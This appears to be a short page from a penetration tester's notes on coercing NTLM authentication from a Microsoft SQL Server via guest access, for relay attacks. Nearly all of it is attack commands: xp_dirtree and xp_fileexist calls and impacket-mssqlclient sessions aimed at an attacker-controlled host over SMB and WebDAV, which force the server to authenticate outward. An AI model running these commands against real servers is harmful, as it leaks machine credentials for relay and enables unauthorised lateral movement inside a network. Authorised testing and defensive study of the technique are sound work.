---
title: NTLM Relay from MSSQL
---

[[notes/ad/ntlm-relay-source]] with guest access to a [[notes/ad/mssql]] server.

[[notes/ad/ntlm-relay-from-smb|Coerce authentication from SMB]].

=== "raw"
    ~~~ sql
    EXEC sys.xp_dirtree '\\hackerpc.corp.local\test'
    EXEC sys.xp_fileexist '\\hackerpc.corp.local\test'
    ~~~

    If the `sys.` prefix does not work try `master.dbo.` or `master..` instead.

=== "[[notes/tools/impacket]]"
    ~~~
    ❯ impacket-mssqlclient -windows-auth -k -no-pass db01.corp.local
    SQL (CORP\jdoe  guest@msdb)> xp_dirtree \\192.168.49.76\test
    ~~~

In the unlikely case that the WebClient is running on the database server [[notes/ad/ntlm-relay-from-webdav|coerce authentication from WebDAV]].

=== "raw"
    ~~~ sql
    EXEC sys.xp_dirtree '\\hackerpc@8080\test'
    EXEC sys.xp_fileexist '\\hackerpc@8080\test'
    ~~~

=== "[[notes/tools/impacket]]"
    ~~~
    ❯ impacket-mssqlclient -windows-auth -k -no-pass db01.corp.local
    SQL (CORP\jdoe  guest@msdb)> xp_dirtree \\hackerpc@8080\test
    ~~~
